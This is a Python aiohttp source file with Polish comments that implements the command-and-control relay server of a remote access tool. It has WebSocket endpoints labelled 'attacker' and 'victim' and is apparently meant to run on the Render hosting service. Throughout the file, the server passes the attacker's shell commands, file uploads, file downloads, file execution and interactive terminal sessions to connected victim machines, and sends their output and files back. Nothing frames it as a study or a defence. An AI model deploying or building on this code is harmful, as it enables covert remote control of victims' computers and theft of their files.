import os
import json
from aiohttp import web

# Przechowujemy połączenia wg roli: "attacker" i "victim"
victims = {}   # {victim_id: ws}
attacker_ws = None


async def health(request):
    """Odpowiada na healthchecki Rendera (HEAD/GET /)."""
    return web.Response(text="ok")


async def notify_attacker(message_dict):
    """Wysyła JSON do attackera jeśli jest podłączony."""
    global attacker_ws
    if attacker_ws is not None:
        try:
            await attacker_ws.send_str(json.dumps(message_dict))
        except Exception:
            pass


async def attacker_handler(request):
    """WebSocket endpoint dla attackera (/attacker)."""
    global attacker_ws
    ws = web.WebSocketResponse(heartbeat=20)
    await ws.prepare(request)
    attacker_ws = ws
    print("[+] Attacker połączony")

    # Wyślij listę aktywnych victimów
    await ws.send_str(json.dumps({
        "type": "victims_list",
        "victims": list(victims.keys())
    }))

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                except json.JSONDecodeError:
                    await ws.send_str(json.dumps({"type": "error", "msg": "Nieprawidłowy JSON"}))
                    continue

                target = data.get("target")
                victim = victims.get(target)

                if not victim:
                    await ws.send_str(json.dumps({
                        "type": "error",
                        "msg": f"Victim '{target}' nie jest podłączony"
                    }))
                    continue

                cmd = data.get("cmd")

                if cmd == "shell":
                    # Wyślij polecenie shell do victima
                    await victim.send_str(json.dumps({
                        "type": "shell",
                        "command": data.get("command", "")
                    }))

                elif cmd == "upload":
                    # Attacker chce wysłać plik do victima
                    # Następna wiadomość binarna to zawartość pliku
                    await victim.send_str(json.dumps({
                        "type": "upload",
                        "filename": data.get("filename", "file.bin")
                    }))

                elif cmd == "download":
                    # Attacker chce pobrać plik od victima
                    await victim.send_str(json.dumps({
                        "type": "download",
                        "filepath": data.get("filepath", "")
                    }))

                elif cmd == "execute":
                    # Uruchom plik na victimie
                    await victim.send_str(json.dumps({
                        "type": "execute",
                        "filepath": data.get("filepath", "")
                    }))

                elif cmd == "terminal_start":
                    # Attacker chce otworzyć interaktywny terminal
                    await victim.send_str(json.dumps({"type": "terminal_start"}))

                elif cmd == "terminal_input":
                    # Attacker wysyła input do terminala victima
                    await victim.send_str(json.dumps({
                        "type": "terminal_input",
                        "input": data.get("input", "")
                    }))

                elif cmd == "terminal_stop":
                    # Attacker zamyka terminal
                    await victim.send_str(json.dumps({"type": "terminal_stop"}))

                elif cmd == "terminal_resize":
                    await victim.send_str(json.dumps({
                        "type": "terminal_resize",
                        "rows": data.get("rows", 24),
                        "cols": data.get("cols", 80)
                    }))

                else:
                    await ws.send_str(json.dumps({"type": "error", "msg": f"Nieznane polecenie: {cmd}"}))

            elif msg.type == web.WSMsgType.BINARY:
                # Attacker wysyła plik binarnie — przekaż do ostatnio
                # adresowanego victima (target z ostatniego JSON)
                # Szukamy w victimach — broadcast do wszystkich lub ostatniego
                for vid, v in victims.items():
                    try:
                        await v.send_bytes(msg.data)
                    except Exception:
                        pass

    except Exception as e:
        print(f"[!] Błąd attacker: {e}")
    finally:
        attacker_ws = None
        print("[-] Attacker rozłączony")

    return ws


async def victim_handler(request):
    """WebSocket endpoint dla victima (/victim)."""
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=50 * 1024 * 1024)
    await ws.prepare(request)

    # Victim podaje swój ID w query string: /victim?id=PC-OFIARA
    victim_id = request.query.get("id", f"victim-{id(ws)}")
    victims[victim_id] = ws
    print(f"[+] Victim połączony: {victim_id} (aktywnych: {len(victims)})")

    await notify_attacker({"type": "victim_connected", "id": victim_id})

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                # Victim odsyła wyniki — przekaż do attackera
                try:
                    data = json.loads(msg.data)
                    data["from"] = victim_id
                    await notify_attacker(data)
                except json.JSONDecodeError:
                    await notify_attacker({"type": "raw", "from": victim_id, "data": msg.data})

            elif msg.type == web.WSMsgType.BINARY:
                # Victim odsyła plik binarnie — przekaż do attackera
                if attacker_ws:
                    # Najpierw info kto wysyła
                    await notify_attacker({
                        "type": "file_incoming",
                        "from": victim_id,
                        "size": len(msg.data)
                    })
                    await attacker_ws.send_bytes(msg.data)

    except Exception as e:
        print(f"[!] Błąd victim {victim_id}: {e}")
    finally:
        victims.pop(victim_id, None)
        print(f"[-] Victim rozłączony: {victim_id} (aktywnych: {len(victims)})")
        await notify_attacker({"type": "victim_disconnected", "id": victim_id})

    return ws


def create_app():
    app = web.Application()
    app.router.add_get("/", health)                  # healthcheck
    app.router.add_get("/attacker", attacker_handler) # attacker endpoint
    app.router.add_get("/victim", victim_handler)     # victim endpoint
    return app


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8765))
    app = create_app()
    print(f"Serwer startuje na 0.0.0.0:{port}")
    web.run_app(app, host="0.0.0.0", port=port)